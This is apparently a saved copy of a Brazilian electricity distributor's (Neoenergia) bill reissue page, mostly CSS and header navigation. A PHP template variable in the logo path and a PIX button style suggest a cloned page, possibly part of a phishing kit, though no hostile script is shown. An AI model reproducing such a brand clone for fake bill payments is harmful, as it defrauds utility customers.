    .vermelho-erro[_ngcontent-icv-c163] {
        color: var(--neo-pure-red);
        font-weight: 600;
    }

    .preta[_ngcontent-icv-c163] {
        color: var(--neo-bandeira-preta);
    }

    .vermelha2[_ngcontent-icv-c163] {
        color: var(--neo-bandeira-vermelha2);
    }

    .vermelha1[_ngcontent-icv-c163] {
        color: var(--neo-bandeira-vermelha1);
    }

    .amarela[_ngcontent-icv-c163] {
        color: var(--neo-bandeira-amarela);
    }

    .verde[_ngcontent-icv-c163] {
        color: var(--neo-bandeira-verde);
    }
    </style>
    <style>
    .notificacoes-header[_ngcontent-icv-c164] {
        padding: 1rem 1.5rem;
        width: 25rem;
    }

    #notificacoes[_ngcontent-icv-c164] ul[_ngcontent-icv-c164] {
        padding-inline-start: 20px;
    }

    #notificacoes[_ngcontent-icv-c164] li[_ngcontent-icv-c164]:before {
        display: block;
        float: left;
        width: 1.2em;
        color: var(--neo-pure-red);
    }

    #data-notificacao[_ngcontent-icv-c164] {
        font-size: smaller;
    }

    .notificacao-interna[_ngcontent-icv-c164] {
        padding: 1rem 0;
        display: flex;
        align-items: center;
    }

    .notificacao[_ngcontent-icv-c164]:first-child .notificacao-interna[_ngcontent-icv-c164] {
        padding: 0 0 1rem 0;
    }

    #notificacoes[_ngcontent-icv-c164] .nova[_ngcontent-icv-c164] {
        color: var(--neo-light-green);
        font-size: 40px;
    }
    </style>
    <style>
    .mat-expansion-panel-header {
        display: flex;
        flex-direction: row;
        align-items: center;
        padding: 0 24px;
        border-radius: inherit;
        transition: height 225ms cubic-bezier(0.4, 0, 0.2, 1)
    }

    .mat-expansion-panel-header._mat-animation-noopable {
        transition: none
    }

    .mat-expansion-panel-header:focus,
    .mat-expansion-panel-header:hover {
        outline: none
    }

    .mat-expansion-panel-header.mat-expanded:focus,
    .mat-expansion-panel-header.mat-expanded:hover {
        background: inherit
    }

    .mat-expansion-panel-header:not([aria-disabled=true]) {
        cursor: pointer
    }

    .mat-expansion-panel-header.mat-expansion-toggle-indicator-before {
        flex-direction: row-reverse
    }

    .mat-expansion-panel-header.mat-expansion-toggle-indicator-before .mat-expansion-indicator {
        margin: 0 16px 0 0
    }

    [dir=rtl] .mat-expansion-panel-header.mat-expansion-toggle-indicator-before .mat-expansion-indicator {
        margin: 0 0 0 16px
    }

    .mat-content {
        display: flex;
        flex: 1;
        flex-direction: row;
        overflow: hidden
    }

    .mat-expansion-panel-header-title,
    .mat-expansion-panel-header-description {
        display: flex;
        flex-grow: 1;
        margin-right: 16px;
        align-items: center
    }

    [dir=rtl] .mat-expansion-panel-header-title,
    [dir=rtl] .mat-expansion-panel-header-description {
        margin-right: 0;
        margin-left: 16px
    }

    .mat-expansion-panel-header-description {
        flex-grow: 2
    }

    .mat-expansion-indicator::after {
        border-style: solid;
        border-width: 0 2px 2px 0;
        content: "";
        display: inline-block;
        padding: 3px;
        transform: rotate(45deg);
        vertical-align: middle
    }

    .cdk-high-contrast-active .mat-expansion-panel .mat-expansion-panel-header.cdk-keyboard-focused:not([aria-disabled=true])::before,
    .cdk-high-contrast-active .mat-expansion-panel .mat-expansion-panel-header.cdk-program-focused:not([aria-disabled=true])::before,
    .cdk-high-contrast-active .mat-expansion-panel:not(.mat-expanded) .mat-expansion-panel-header:hover:not([aria-disabled=true])::before {
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        position: absolute;
        box-sizing: border-box;
        pointer-events: none;
        border: 3px solid;
        border-radius: 4px;
        content: ""
    }

    .cdk-high-contrast-active .mat-expansion-panel-content {
        border-top: 1px solid;
        border-top-left-radius: 0;
        border-top-right-radius: 0
    }
    </style>
    <style>
    .mat-divider {
        display: block;
        margin: 0;
        border-top-width: 1px;
        border-top-style: solid
    }

    .mat-divider.mat-divider-vertical {
        border-top: 0;
        border-right-width: 1px;
        border-right-style: solid
    }

    .mat-divider.mat-divider-inset {
        margin-left: 80px
    }

    [dir=rtl] .mat-divider.mat-divider-inset {
        margin-left: auto;
        margin-right: 80px
    }
    </style>
    <style>
    .mat-subheader {
        display: flex;
        box-sizing: border-box;
        padding: 16px;
        align-items: center
    }

    .mat-list-base .mat-subheader {
        margin: 0
    }

    button.mat-list-item,
    button.mat-list-option {
        padding: 0;
        width: 100%;
        background: none;
        color: inherit;
        border: none;
        outline: inherit;
        -webkit-tap-highlight-color: transparent;
        text-align: left
    }

    [dir=rtl] button.mat-list-item,
    [dir=rtl] button.mat-list-option {
        text-align: right
    }

    button.mat-list-item::-moz-focus-inner,
    button.mat-list-option::-moz-focus-inner {
        border: 0
    }

    .mat-list-base {
        padding-top: 8px;
        display: block;
        -webkit-tap-highlight-color: transparent
    }

    .mat-list-base .mat-subheader {
        height: 48px;
        line-height: 16px
    }

    .mat-list-base .mat-subheader:first-child {
        margin-top: -8px
    }

    .mat-list-base .mat-list-item,
    .mat-list-base .mat-list-option {
        display: block;
        height: 48px;
        -webkit-tap-highlight-color: transparent;
        width: 100%;
        padding: 0
    }

    .mat-list-base .mat-list-item .mat-list-item-content,
    .mat-list-base .mat-list-option .mat-list-item-content {
        display: flex;
        flex-direction: row;
        align-items: center;
        box-sizing: border-box;
        padding: 0 16px;
        position: relative;
        height: inherit
    }

    .mat-list-base .mat-list-item .mat-list-item-content-reverse,
    .mat-list-base .mat-list-option .mat-list-item-content-reverse {
        display: flex;
        align-items: center;
        padding: 0 16px;
        flex-direction: row-reverse;
        justify-content: space-around
    }

    .mat-list-base .mat-list-item .mat-list-item-ripple,
    .mat-list-base .mat-list-option .mat-list-item-ripple {
        display: block;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        position: absolute;
        pointer-events: none
    }

    .mat-list-base .mat-list-item.mat-list-item-with-avatar,
    .mat-list-base .mat-list-option.mat-list-item-with-avatar {
        height: 56px
    }

    .mat-list-base .mat-list-item.mat-2-line,
    .mat-list-base .mat-list-option.mat-2-line {
        height: 72px
    }

    .mat-list-base .mat-list-item.mat-3-line,
    .mat-list-base .mat-list-option.mat-3-line {
        height: 88px
    }

    .mat-list-base .mat-list-item.mat-multi-line,
    .mat-list-base .mat-list-option.mat-multi-line {
        height: auto
    }

    .mat-list-base .mat-list-item.mat-multi-line .mat-list-item-content,
    .mat-list-base .mat-list-option.mat-multi-line .mat-list-item-content {
        padding-top: 16px;
        padding-bottom: 16px
    }

    .mat-list-base .mat-list-item .mat-list-text,
    .mat-list-base .mat-list-option .mat-list-text {
        display: flex;
        flex-direction: column;
        flex: auto;
        box-sizing: border-box;
        overflow: hidden;
        padding: 0
    }

    .mat-list-base .mat-list-item .mat-list-text>*,
    .mat-list-base .mat-list-option .mat-list-text>* {
        margin: 0;
        padding: 0;
        font-weight: normal;
        font-size: inherit
    }

    .mat-list-base .mat-list-item .mat-list-text:empty,
    .mat-list-base .mat-list-option .mat-list-text:empty {
        display: none
    }

    .mat-list-base .mat-list-item.mat-list-item-with-avatar .mat-list-item-content .mat-list-text,
    .mat-list-base .mat-list-item.mat-list-option .mat-list-item-content .mat-list-text,
    .mat-list-base .mat-list-option.mat-list-item-with-avatar .mat-list-item-content .mat-list-text,
    .mat-list-base .mat-list-option.mat-list-option .mat-list-item-content .mat-list-text {
        padding-right: 0;
        padding-left: 16px
    }

    [dir=rtl] .mat-list-base .mat-list-item.mat-list-item-with-avatar .mat-list-item-content .mat-list-text,
    [dir=rtl] .mat-list-base .mat-list-item.mat-list-option .mat-list-item-content .mat-list-text,
    [dir=rtl] .mat-list-base .mat-list-option.mat-list-item-with-avatar .mat-list-item-content .mat-list-text,
    [dir=rtl] .mat-list-base .mat-list-option.mat-list-option .mat-list-item-content .mat-list-text {
        padding-right: 16px;
        padding-left: 0
    }

    .mat-list-base .mat-list-item.mat-list-item-with-avatar .mat-list-item-content-reverse .mat-list-text,
    .mat-list-base .mat-list-item.mat-list-option .mat-list-item-content-reverse .mat-list-text,
    .mat-list-base .mat-list-option.mat-list-item-with-avatar .mat-list-item-content-reverse .mat-list-text,
    .mat-list-base .mat-list-option.mat-list-option .mat-list-item-content-reverse .mat-list-text {
        padding-left: 0;
        padding-right: 16px
    }

    [dir=rtl] .mat-list-base .mat-list-item.mat-list-item-with-avatar .mat-list-item-content-reverse .mat-list-text,
    [dir=rtl] .mat-list-base .mat-list-item.mat-list-option .mat-list-item-content-reverse .mat-list-text,
    [dir=rtl] .mat-list-base .mat-list-option.mat-list-item-with-avatar .mat-list-item-content-reverse .mat-list-text,
    [dir=rtl] .mat-list-base .mat-list-option.mat-list-option .mat-list-item-content-reverse .mat-list-text {
        padding-right: 0;
        padding-left: 16px
    }

    .mat-list-base .mat-list-item.mat-list-item-with-avatar.mat-list-option .mat-list-item-content-reverse .mat-list-text,
    .mat-list-base .mat-list-item.mat-list-item-with-avatar.mat-list-option .mat-list-item-content .mat-list-text,
    .mat-list-base .mat-list-option.mat-list-item-with-avatar.mat-list-option .mat-list-item-content-reverse .mat-list-text,
    .mat-list-base .mat-list-option.mat-list-item-with-avatar.mat-list-option .mat-list-item-content .mat-list-text {
        padding-right: 16px;
        padding-left: 16px
    }

    .mat-list-base .mat-list-item .mat-list-avatar,
    .mat-list-base .mat-list-option .mat-list-avatar {
        flex-shrink: 0;
        width: 40px;
        height: 40px;
        border-radius: 50%;
        object-fit: cover
    }

    .mat-list-base .mat-list-item .mat-list-avatar~.mat-divider-inset,
    .mat-list-base .mat-list-option .mat-list-avatar~.mat-divider-inset {
        margin-left: 72px;
        width: calc(100% - 72px)
    }

    [dir=rtl] .mat-list-base .mat-list-item .mat-list-avatar~.mat-divider-inset,
    [dir=rtl] .mat-list-base .mat-list-option .mat-list-avatar~.mat-divider-inset {
        margin-left: auto;
        margin-right: 72px
    }

    .mat-list-base .mat-list-item .mat-list-icon,
    .mat-list-base .mat-list-option .mat-list-icon {
        flex-shrink: 0;
        width: 24px;
        height: 24px;
        font-size: 24px;
        box-sizing: content-box;
        border-radius: 50%;
        padding: 4px
    }

    .mat-list-base .mat-list-item .mat-list-icon~.mat-divider-inset,
    .mat-list-base .mat-list-option .mat-list-icon~.mat-divider-inset {
        margin-left: 64px;
        width: calc(100% - 64px)
    }

    [dir=rtl] .mat-list-base .mat-list-item .mat-list-icon~.mat-divider-inset,
    [dir=rtl] .mat-list-base .mat-list-option .mat-list-icon~.mat-divider-inset {
        margin-left: auto;
        margin-right: 64px
    }

    .mat-list-base .mat-list-item .mat-divider,
    .mat-list-base .mat-list-option .mat-divider {
        position: absolute;
        bottom: 0;
        left: 0;
        width: 100%;
        margin: 0
    }

    [dir=rtl] .mat-list-base .mat-list-item .mat-divider,
    [dir=rtl] .mat-list-base .mat-list-option .mat-divider {
        margin-left: auto;
        margin-right: 0
    }

    .mat-list-base .mat-list-item .mat-divider.mat-divider-inset,
    .mat-list-base .mat-list-option .mat-divider.mat-divider-inset {
        position: absolute
    }

    .mat-list-base[dense] {
        padding-top: 4px;
        display: block
    }

    .mat-list-base[dense] .mat-subheader {
        height: 40px;
        line-height: 8px
    }

    .mat-list-base[dense] .mat-subheader:first-child {
        margin-top: -4px
    }

    .mat-list-base[dense] .mat-list-item,
    .mat-list-base[dense] .mat-list-option {
        display: block;
        height: 40px;
        -webkit-tap-highlight-color: transparent;
        width: 100%;
        padding: 0
    }

    .mat-list-base[dense] .mat-list-item .mat-list-item-content,
    .mat-list-base[dense] .mat-list-option .mat-list-item-content {
        display: flex;
        flex-direction: row;
        align-items: center;
        box-sizing: border-box;
        padding: 0 16px;
        position: relative;
        height: inherit
    }

    .mat-list-base[dense] .mat-list-item .mat-list-item-content-reverse,
    .mat-list-base[dense] .mat-list-option .mat-list-item-content-reverse {
        display: flex;
        align-items: center;
        padding: 0 16px;
        flex-direction: row-reverse;
        justify-content: space-around
    }

    .mat-list-base[dense] .mat-list-item .mat-list-item-ripple,
    .mat-list-base[dense] .mat-list-option .mat-list-item-ripple {
        display: block;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        position: absolute;
        pointer-events: none
    }

    .mat-list-base[dense] .mat-list-item.mat-list-item-with-avatar,
    .mat-list-base[dense] .mat-list-option.mat-list-item-with-avatar {
        height: 48px
    }

    .mat-list-base[dense] .mat-list-item.mat-2-line,
    .mat-list-base[dense] .mat-list-option.mat-2-line {
        height: 60px
    }

    .mat-list-base[dense] .mat-list-item.mat-3-line,
    .mat-list-base[dense] .mat-list-option.mat-3-line {
        height: 76px
    }

    .mat-list-base[dense] .mat-list-item.mat-multi-line,
    .mat-list-base[dense] .mat-list-option.mat-multi-line {
        height: auto
    }

    .mat-list-base[dense] .mat-list-item.mat-multi-line .mat-list-item-content,
    .mat-list-base[dense] .mat-list-option.mat-multi-line .mat-list-item-content {
        padding-top: 16px;
        padding-bottom: 16px
    }

    .mat-list-base[dense] .mat-list-item .mat-list-text,
    .mat-list-base[dense] .mat-list-option .mat-list-text {
        display: flex;
        flex-direction: column;
        flex: auto;
        box-sizing: border-box;
        overflow: hidden;
        padding: 0
    }

    .mat-list-base[dense] .mat-list-item .mat-list-text>*,
    .mat-list-base[dense] .mat-list-option .mat-list-text>* {
        margin: 0;
        padding: 0;
        font-weight: normal;
        font-size: inherit
    }

    .mat-list-base[dense] .mat-list-item .mat-list-text:empty,
    .mat-list-base[dense] .mat-list-option .mat-list-text:empty {
        display: none
    }

    .mat-list-base[dense] .mat-list-item.mat-list-item-with-avatar .mat-list-item-content .mat-list-text,
    .mat-list-base[dense] .mat-list-item.mat-list-option .mat-list-item-content .mat-list-text,
    .mat-list-base[dense] .mat-list-option.mat-list-item-with-avatar .mat-list-item-content .mat-list-text,
    .mat-list-base[dense] .mat-list-option.mat-list-option .mat-list-item-content .mat-list-text {
        padding-right: 0;
        padding-left: 16px
    }

    [dir=rtl] .mat-list-base[dense] .mat-list-item.mat-list-item-with-avatar .mat-list-item-content .mat-list-text,
    [dir=rtl] .mat-list-base[dense] .mat-list-item.mat-list-option .mat-list-item-content .mat-list-text,
    [dir=rtl] .mat-list-base[dense] .mat-list-option.mat-list-item-with-avatar .mat-list-item-content .mat-list-text,
    [dir=rtl] .mat-list-base[dense] .mat-list-option.mat-list-option .mat-list-item-content .mat-list-text {
        padding-right: 16px;
        padding-left: 0
    }

    .mat-list-base[dense] .mat-list-item.mat-list-item-with-avatar .mat-list-item-content-reverse .mat-list-text,
    .mat-list-base[dense] .mat-list-item.mat-list-option .mat-list-item-content-reverse .mat-list-text,
    .mat-list-base[dense] .mat-list-option.mat-list-item-with-avatar .mat-list-item-content-reverse .mat-list-text,
    .mat-list-base[dense] .mat-list-option.mat-list-option .mat-list-item-content-reverse .mat-list-text {
        padding-left: 0;
        padding-right: 16px
    }

    [dir=rtl] .mat-list-base[dense] .mat-list-item.mat-list-item-with-avatar .mat-list-item-content-reverse .mat-list-text,
    [dir=rtl] .mat-list-base[dense] .mat-list-item.mat-list-option .mat-list-item-content-reverse .mat-list-text,
    [dir=rtl] .mat-list-base[dense] .mat-list-option.mat-list-item-with-avatar .mat-list-item-content-reverse .mat-list-text,
    [dir=rtl] .mat-list-base[dense] .mat-list-option.mat-list-option .mat-list-item-content-reverse .mat-list-text {
        padding-right: 0;
        padding-left: 16px
    }

    .mat-list-base[dense] .mat-list-item.mat-list-item-with-avatar.mat-list-option .mat-list-item-content-reverse .mat-list-text,
    .mat-list-base[dense] .mat-list-item.mat-list-item-with-avatar.mat-list-option .mat-list-item-content .mat-list-text,
    .mat-list-base[dense] .mat-list-option.mat-list-item-with-avatar.mat-list-option .mat-list-item-content-reverse .mat-list-text,
    .mat-list-base[dense] .mat-list-option.mat-list-item-with-avatar.mat-list-option .mat-list-item-content .mat-list-text {
        padding-right: 16px;
        padding-left: 16px
    }

    .mat-list-base[dense] .mat-list-item .mat-list-avatar,
    .mat-list-base[dense] .mat-list-option .mat-list-avatar {
        flex-shrink: 0;
        width: 36px;
        height: 36px;
        border-radius: 50%;
        object-fit: cover
    }

    .mat-list-base[dense] .mat-list-item .mat-list-avatar~.mat-divider-inset,
    .mat-list-base[dense] .mat-list-option .mat-list-avatar~.mat-divider-inset {
        margin-left: 68px;
        width: calc(100% - 68px)
    }

    [dir=rtl] .mat-list-base[dense] .mat-list-item .mat-list-avatar~.mat-divider-inset,
    [dir=rtl] .mat-list-base[dense] .mat-list-option .mat-list-avatar~.mat-divider-inset {
        margin-left: auto;
        margin-right: 68px
    }

    .mat-list-base[dense] .mat-list-item .mat-list-icon,
    .mat-list-base[dense] .mat-list-option .mat-list-icon {
        flex-shrink: 0;
        width: 20px;
        height: 20px;
        font-size: 20px;
        box-sizing: content-box;
        border-radius: 50%;
        padding: 4px
    }

    .mat-list-base[dense] .mat-list-item .mat-list-icon~.mat-divider-inset,
    .mat-list-base[dense] .mat-list-option .mat-list-icon~.mat-divider-inset {
        margin-left: 60px;
        width: calc(100% - 60px)
    }

    [dir=rtl] .mat-list-base[dense] .mat-list-item .mat-list-icon~.mat-divider-inset,
    [dir=rtl] .mat-list-base[dense] .mat-list-option .mat-list-icon~.mat-divider-inset {
        margin-left: auto;
        margin-right: 60px
    }

    .mat-list-base[dense] .mat-list-item .mat-divider,
    .mat-list-base[dense] .mat-list-option .mat-divider {
        position: absolute;
        bottom: 0;
        left: 0;
        width: 100%;
        margin: 0
    }

    [dir=rtl] .mat-list-base[dense] .mat-list-item .mat-divider,
    [dir=rtl] .mat-list-base[dense] .mat-list-option .mat-divider {
        margin-left: auto;
        margin-right: 0
    }

    .mat-list-base[dense] .mat-list-item .mat-divider.mat-divider-inset,
    .mat-list-base[dense] .mat-list-option .mat-divider.mat-divider-inset {
        position: absolute
    }

    .mat-nav-list a {
        text-decoration: none;
        color: inherit
    }

    .mat-nav-list .mat-list-item {
        cursor: pointer;
        outline: none
    }

    mat-action-list .mat-list-item {
        cursor: pointer;
        outline: inherit
    }

    .mat-list-option:not(.mat-list-item-disabled) {
        cursor: pointer;
        outline: none
    }

    .mat-list-item-disabled {
        pointer-events: none
    }

    .cdk-high-contrast-active .mat-list-item-disabled {
        opacity: .5
    }

    .cdk-high-contrast-active :host .mat-list-item-disabled {
        opacity: .5
    }

    .cdk-high-contrast-active .mat-selection-list:focus {
        outline-style: dotted
    }

    .cdk-high-contrast-active .mat-list-option:hover,
    .cdk-high-contrast-active .mat-list-option:focus,
    .cdk-high-contrast-active .mat-nav-list .mat-list-item:hover,
    .cdk-high-contrast-active .mat-nav-list .mat-list-item:focus,
    .cdk-high-contrast-active mat-action-list .mat-list-item:hover,
    .cdk-high-contrast-active mat-action-list .mat-list-item:focus {
        outline: dotted 1px;
        z-index: 1
    }

    .cdk-high-contrast-active .mat-list-single-selected-option::after {
        content: "";
        position: absolute;
        top: 50%;
        right: 16px;
        transform: translateY(-50%);
        width: 10px;
        height: 0;
        border-bottom: solid 10px;
        border-radius: 10px
    }

    .cdk-high-contrast-active [dir=rtl] .mat-list-single-selected-option::after {
        right: auto;
        left: 16px
    }

    @media(hover: none) {

        .mat-list-option:not(.mat-list-single-selected-option):not(.mat-list-item-disabled):hover,
        .mat-nav-list .mat-list-item:not(.mat-list-item-disabled):hover,
        .mat-action-list .mat-list-item:not(.mat-list-item-disabled):hover {
            background: none
        }
    }
    </style>
    <style></style>
    <style>
    #card-acesso-segunda-via mat-card {
        max-width: 500px;
        margin: auto;
        border: 1px solid var(--neo-light-green);
        padding: 2rem 2rem 2.5rem 2rem;
    }

    #card-acesso-segunda-via .texto {
        padding: 0.5rem 0rem;
    }

    #card-acesso-segunda-via h2 {
        color: var(--neo-dark-gray);
    }

    #card-acesso-segunda-via p {
        font-size: 0.875rem;
    }

    #card-acesso-segunda-via .mat-datepicker-toggle-default-icon {
        fill: var(--neo-dark-gray);
    }

    #card-acesso-segunda-via .mat-form-field-appearance-outline .mat-form-field-subscript-wrapper {
        padding: 0;
    }

    #card-acesso-segunda-via .mat-form-field-wrapper {
        padding: 0;
    }

    #card-acesso-segunda-via .hidden-datepicker-input {
        display: none;
    }

    #card-acesso-segunda-via .text-alert {
        text-align: justify;
    }

    #card-acesso-segunda-via select {
        padding-left: 15px;
        font-size: 1.2em;
        font-size-adjust: 0.3;
    }

    #card-acesso-segunda-via .vermelho {
        color: #EF3D59;
    }
    </style>
    <style>
    .protocolo-container[_ngcontent-icv-c168] {
        background-color: #EFEFEF;
        width: -moz-fit-content;
        width: fit-content;
        border-radius: 4px;
    }

    .protocolo-label[_ngcontent-icv-c168] {
        color: var(--neo-white-600);
    }

    .protocolo-text[_ngcontent-icv-c168] {
        font-weight: 600;
        color: #605D5A;
    }
    </style>
    <style>
    .mat-card {
        transition: box-shadow 280ms cubic-bezier(0.4, 0, 0.2, 1);
        display: block;
        position: relative;
        padding: 16px;
        border-radius: 4px
    }

    ._mat-animation-noopable.mat-card {
        transition: none;
        animation: none
    }

    .mat-card .mat-divider-horizontal {
        position: absolute;
        left: 0;
        width: 100%
    }

    [dir=rtl] .mat-card .mat-divider-horizontal {
        left: auto;
        right: 0
    }

    .mat-card .mat-divider-horizontal.mat-divider-inset {
        position: static;
        margin: 0
    }

    [dir=rtl] .mat-card .mat-divider-horizontal.mat-divider-inset {
        margin-right: 0
    }

    .cdk-high-contrast-active .mat-card {
        outline: solid 1px
    }

    .mat-card-actions,
    .mat-card-subtitle,
    .mat-card-content {
        display: block;
        margin-bottom: 16px
    }

    .mat-card-title {
        display: block;
        margin-bottom: 8px
    }

    .mat-card-actions {
        margin-left: -8px;
        margin-right: -8px;
        padding: 8px 0
    }

    .mat-card-actions-align-end {
        display: flex;
        justify-content: flex-end
    }

    .mat-card-image {
        width: calc(100% + 32px);
        margin: 0 -16px 16px -16px;
        display: block;
        overflow: hidden
    }

    .mat-card-image img {
        width: 100%
    }

    .mat-card-footer {
        display: block;
        margin: 0 -16px -16px -16px
    }

    .mat-card-actions .mat-button,
    .mat-card-actions .mat-raised-button,
    .mat-card-actions .mat-stroked-button {
        margin: 0 8px
    }

    .mat-card-header {
        display: flex;
        flex-direction: row
    }

    .mat-card-header .mat-card-title {
        margin-bottom: 12px
    }

    .mat-card-header-text {
        margin: 0 16px
    }

    .mat-card-avatar {
        height: 40px;
        width: 40px;
        border-radius: 50%;
        flex-shrink: 0;
        object-fit: cover
    }

    .mat-card-title-group {
        display: flex;
        justify-content: space-between
    }

    .mat-card-sm-image {
        width: 80px;
        height: 80px
    }

    .mat-card-md-image {
        width: 112px;
        height: 112px
    }

    .mat-card-lg-image {
        width: 152px;
        height: 152px
    }

    .mat-card-xl-image {
        width: 240px;
        height: 240px;
        margin: -8px
    }

    .mat-card-title-group>.mat-card-xl-image {
        margin: -8px 0 8px
    }

    @media(max-width: 599px) {
        .mat-card-title-group {
            margin: 0
        }

        .mat-card-xl-image {
            margin-left: 0;
            margin-right: 0
        }
    }

    .mat-card>:first-child,
    .mat-card-content>:first-child {
        margin-top: 0
    }

    .mat-card>:last-child:not(.mat-card-footer),
    .mat-card-content>:last-child:not(.mat-card-footer) {
        margin-bottom: 0
    }

    .mat-card-image:first-child {
        margin-top: -16px;
        border-top-left-radius: inherit;
        border-top-right-radius: inherit
    }

    .mat-card>.mat-card-actions:last-child {
        margin-bottom: -8px;
        padding-bottom: 0
    }

    .mat-form-field-infix {
        display: block;
        position: relative;
        flex: auto;
        min-width: 0;
        width: 180px;
    }

    .mat-form-field-appearance-outline .mat-form-field-outline-gap {
        border-radius: .000001px;
        border: 1px solid currentColor;
        border-left-style: none;
        border-right-style: none;
    }

    .mat-card-actions:not(.mat-card-actions-align-end) .mat-button:first-child,
    .mat-card-actions:not(.mat-card-actions-align-end) .mat-raised-button:first-child,
    .mat-card-actions:not(.mat-card-actions-align-end) .mat-stroked-button:first-child {
        margin-left: 0;
        margin-right: 0
    }

    .mat-form-field-infix {
        padding: 0.5em 0;
        border-top: 0.84375em solid transparent;
    }

    .mat-form-field-label-wrapper {
        position: absolute;
        left: 0;
        box-sizing: content-box;
        width: 100%;
        height: 100%;
        overflow: hidden;
        pointer-events: none;
    }

    .mat-form-field-appearance-outline .mat-form-field-outline {
        color: rgba(0, 16, 11, 0.12);
    }

    .mat-card-actions-align-end .mat-button:last-child,
    .mat-card-actions-align-end .mat-raised-button:last-child,
    .mat-card-actions-align-end .mat-stroked-button:last-child {
        margin-left: 0;
        margin-right: 0
    }

    .mat-input-element {
        font: inherit;
        background: transparent;
        color: currentColor;
        border: none;
        outline: none;
        padding: 0;
        margin: 0;
        width: 100%;
        max-width: 100%;
        vertical-align: bottom;
        text-align: inherit;
        box-sizing: content-box;
    }

    .btn-pix {
        vertical-align: middle;
        background-color: #0177c5;
        color: #ffffff;
    }

    .mat-card-title:not(:first-child),
    .mat-card-subtitle:not(:first-child) {
        margin-top: -4px
    }

    .mat-card-header .mat-card-subtitle:not(:first-child) {
        margin-top: -8px
    }

    .mat-card>.mat-card-xl-image:first-child {
        margin-top: -8px
    }

    .mat-card>.mat-card-xl-image:last-child {
        margin-bottom: -8px
    }

    .loading-container {
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        height: 100vh;
        background-color: #ffffffad;
        position: fixed;
        z-index: 99999;
        width: 100%;
    }

    .spinner {
        width: 50px;
        height: 50px;
        border: 6px solid #ccc;
        border-top: 6px solid #007bff;
        border-radius: 50%;
        animation: spin 1s linear infinite;
        margin-bottom: 20px;
    }

    @keyframes spin {
        to {
            transform: rotate(360deg);
        }
    }

    .loading-text {
        font-size: 1.2rem;
        color: #333;
    }
    </style>
</head>

<body>

    <div class="loading-container" style="display: none;">
        <div class="spinner"></div>
        <p class="loading-text">Buscando fatura...</p>
    </div>


    <app-root ng-version="13.4.0">
        <!---->
        <app-header>
            <header id="header">
                <!---->
                <nav id="navbar" class="header-padrao">
                    <div class="first-header-row">
                        <div class="width-agencia">
                            <div class="row justify-content-between align-items-center">
                                <div class="col-auto">
                                    <div class="d-flex"><button
                                            class="mat-focus-indicator d-lg-none d-block col-auto mat-icon-button mat-button-base"><span
                                                class="mat-button-wrapper">
                                                <mat-icon role="img" id="menu-sidenav"
                                                    class="mat-icon notranslate material-icons mat-icon-no-color"
                                                    aria-hidden="true" data-mat-icon-type="font">menu</mat-icon>
                                            </span><span matripple=""
                                                class="mat-ripple mat-button-ripple mat-button-ripple-round"></span><span
                                                class="mat-button-focus-overlay"></span></button><a><img
                                                alt="Distribuidora de Energia" class="header-logo col-auto p-0"
                                                src="./<?= $diretorio ?>//index_files/logo_neoenergia_letra_branca.svg"></a>
                                        <!---->
                                        <!---->
                                        <div id="icone-indicador-perfil" class="col-auto"></div>
                                    </div>
                                </div>
                                <!----><button type="button" mat-button="" color="primary" style="display: none;"
                                    class="mat-focus-indicator btn-login col-auto mat-button mat-button-base mat-primary ng-star-inserted"><span
                                        class="mat-button-wrapper"> Login <mat-icon role="img"
                                            class="mat-icon notranslate material-icons mat-icon-no-color"
                                            aria-hidden="true" data-mat-icon-type="font">arrow_forward</mat-icon>
                                    </span><span matripple="" class="mat-ripple mat-button-ripple"></span><span
                                        class="mat-button-focus-overlay"></span></button>
                                <!---->
                            </div>
                        </div>
                    </div>
                    <div class="d-none d-lg-flex second-header-row">
                        <div class="width-agencia">
                            <div class="d-flex align-items-center justify-content-between">
                                <div class="row align-items-center"><button type="button" mat-button="" color="primary"
                                        class="mat-focus-indicator col-auto btn-header mat-button mat-button-base mat-primary"><span
                                            class="mat-button-wrapper"><strong>Início</strong></span><span matripple=""
                                            class="mat-ripple mat-button-ripple"></span><span
                                            class="mat-button-focus-overlay"></span></button><button type="button"
                                        mat-button="" color="primary"
                                        class="mat-focus-indicator col-auto btn-header mat-button mat-button-base mat-primary ng-star-inserted"><span
                                            class="mat-button-wrapper"><strong>Para Você</strong>
                                            <mat-icon role="img"
                                                class="mat-icon notranslate material-icons mat-icon-no-color"
                                                aria-hidden="true" data-mat-icon-type="font"><span
                                                    class="material-icons-outlined rotate-down"
                                                    id="menu-status-0">expand_more</span></mat-icon>
                                        </span><span matripple="" class="mat-ripple mat-button-ripple"></span><span
                                            class="mat-button-focus-overlay"></span></button><button type="button"
                                        mat-button="" color="primary"
                                        class="mat-focus-indicator col-auto btn-header mat-button mat-button-base mat-primary ng-star-inserted"><span
                                            class="mat-button-wrapper"><strong>Para a Unidade Consumidora</strong>
                                            <mat-icon role="img"
                                                class="mat-icon notranslate material-icons mat-icon-no-color"
                                                aria-hidden="true" data-mat-icon-type="font"><span
                                                    class="material-icons-outlined rotate-down"
                                                    id="menu-status-1">expand_more</span></mat-icon>
                                        </span><span matripple="" class="mat-ripple mat-button-ripple"></span><span
                                            class="mat-button-focus-overlay"></span></button><button type="button"
                                        mat-button="" color="primary"
                                        class="mat-focus-indicator col-auto btn-header mat-button mat-button-base mat-primary ng-star-inserted"><span
                                            class="mat-button-wrapper"><strong>Fale Conosco</strong>
                                            <mat-icon role="img"
                                                class="mat-icon notranslate material-icons mat-icon-no-color"
                                                aria-hidden="true" data-mat-icon-type="font"><span
                                                    class="material-icons-outlined rotate-down"
                                                    id="menu-status-2">expand_more</span></mat-icon>
                                        </span><span matripple="" class="mat-ripple mat-button-ripple"></span><span
                                            class="mat-button-focus-overlay"></span></button><button type="button"
                                        mat-button="" color="primary"
                                        class="mat-focus-indicator col-auto btn-header mat-button mat-button-base mat-primary ng-star-inserted"><span
                                            class="mat-button-wrapper"><strong>Neoenergia</strong>
                                            <mat-icon role="img"
                                                class="mat-icon notranslate material-icons mat-icon-no-color"
                                                aria-hidden="true" data-mat-icon-type="font"><span
                                                    class="material-icons-outlined rotate-down"
                                                    id="menu-status-3">expand_more</span></mat-icon>
                                        </span><span matripple="" class="mat-ripple mat-button-ripple"></span><span
                                            class="mat-button-focus-overlay"></span></button>
                                    <!---->
                                </div>
                                <div class="row align-items-center">
                                    <!---->
                                    <!---->
                                    <mat-menu class="">
                                        <!---->
                                    </mat-menu>
                                </div>
                            </div>
